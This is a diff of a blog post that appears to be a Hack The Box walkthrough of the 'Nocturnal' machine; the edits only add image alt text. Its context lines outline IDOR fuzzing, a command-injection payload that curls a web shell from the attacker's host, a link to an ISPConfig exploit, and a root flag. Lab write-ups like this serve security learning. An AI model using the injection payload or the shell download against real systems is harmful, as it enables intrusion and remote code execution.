@@ -5,7 +5,7 @@ categories: [HTB Easy Machines]
 tags: [Easy, Linux, HTB, Value Fuzzing, PHP, Filter Bypass, Command Injection, Hashcat, Local Port Forward, ISPConfig, Password Reuse]
 ---
 
-<img src="/assets/img/nocturnal/image.png">
+<img src="/assets/img/nocturnal/image.png" alt="/assets/img/nocturnal/image.png">
 
 Nocturnal is an easy HTB machine where you have to abuse an `IDOR` vulnerability to get access to the admin panel where by reading the source code we can craft a `command injection` payload bypassing the filters. From there, we `locally forward` a service running internally and make use of `password reusage` to get a valid session. Finally we exploit a vulnerability on the service to get root access.
 
@@ -35,13 +35,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 > Let's add the hostname to our /etc/hosts file: `echo -e '10.10.11.64\tnocturnal.htb' | sudo tee -a /etc/hosts`
 
 Let's take a look at [http://nocturnal.htb/](http://nocturnal.htb/):
-<img src="/assets/img/nocturnal/image2.png">
+<img src="/assets/img/nocturnal/image2.png" alt="/assets/img/nocturnal/image2.png">
 
 # Exploit
 ## IDOR
 
 After uploading a file we get a share link:
-<img src="/assets/img/nocturnal/image3.png">
+<img src="/assets/img/nocturnal/image3.png" alt="/assets/img/nocturnal/image3.png">
 >`http://nocturnal.htb/view.php?username=t3mpx&file=test.pdf`
 
 Fuzzing for different usernames gives us some possible users:
@@ -112,7 +112,7 @@ $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  
 > Command used to create the zip
 
 Let's set up a python server hosting [p0wny shell](https://github.com/flozz/p0wny-shell) and run the payload in BurpSuite:
-<img src="/assets/img/nocturnal/image4.png">
+<img src="/assets/img/nocturnal/image4.png" alt="/assets/img/nocturnal/image4.png">
 > `a"curl%0910.10.14.6/shell.php%09-o%09shell.php%09#` 
 
 >Using `"` to break out of the PHP command, URL-encoded tabs instead of spaces and a `#` to ignore everything after.
@@ -224,7 +224,7 @@ Let's set up a local port forward:
 ```
 
 Visiting the service shows it's a ISPCONFIG instance:
-<img src="/assets/img/nocturnal/image5.png">
+<img src="/assets/img/nocturnal/image5.png" alt="/assets/img/nocturnal/image5.png">
 > Reusing the password of tobias with the admin user gives us access
 
 Using the following [exploit](https://github.com/ajdumanhug/CVE-2023-46818) gives us a pseudo-shell as root:
@@ -281,6 +281,7 @@ root@nocturnal:~#
 root@nocturnal:~# cat root.txt 
 502e1063918b5411ed0d99b7e9821f15
 ```
+
 
 
 
